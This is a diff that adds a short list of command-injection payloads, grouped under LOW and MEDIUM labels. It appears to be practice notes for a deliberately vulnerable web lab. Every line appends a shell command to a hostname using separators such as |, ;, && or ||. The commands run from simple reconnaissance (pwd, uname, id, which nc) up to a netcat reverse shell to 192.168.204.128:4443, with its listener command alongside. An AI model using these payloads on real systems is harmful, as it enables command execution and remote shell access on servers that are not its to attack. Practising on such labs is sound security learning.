@@ -1,0 +1,46 @@
+LOW
+www.google.com| pwd
+www.google.com |pwd
+www.google.com | pwd
+www.google.com|pwd
+www.google.com; pwd
+www.google.com ;pwd
+www.google.com ; pwd
+www.google.com;pwd
+www.google.com& pwd
+www.google.com &pwd
+www.google.com & pwd
+www.google.com&pwd
+
+www.google.com&& pwd
+www.google.com &&pwd
+www.google.com && pwd
+www.google.com&&pwd
+
+www.google.com|| pwd    	(Only when the first command fails.)
+www.google.com ||pwd		(Only when the first command fails.)
+www.google.com || pwd     	(Only when the first command fails.)
+www.google.com||pwd       	(Only when the first command fails.)
+
+www.google.com | uname
+www.google.com | id
+www.google.com | which nc
+www.google.com | /bin/nc -e /bin/sh 192.168.204.128 4443	(nc -nlvp 4443)
+
+MEDIUM
+www.google.com| pwd
+www.google.com |pwd
+www.google.com | pwd
+www.google.com|pwd
+
+www.google.com | uname
+www.google.com | id
+www.google.com | which nc
+www.google.com | /bin/nc -e /bin/sh 192.168.204.128 4443	(nc -nlvp 4443)
+
+
+
+
+
+
+
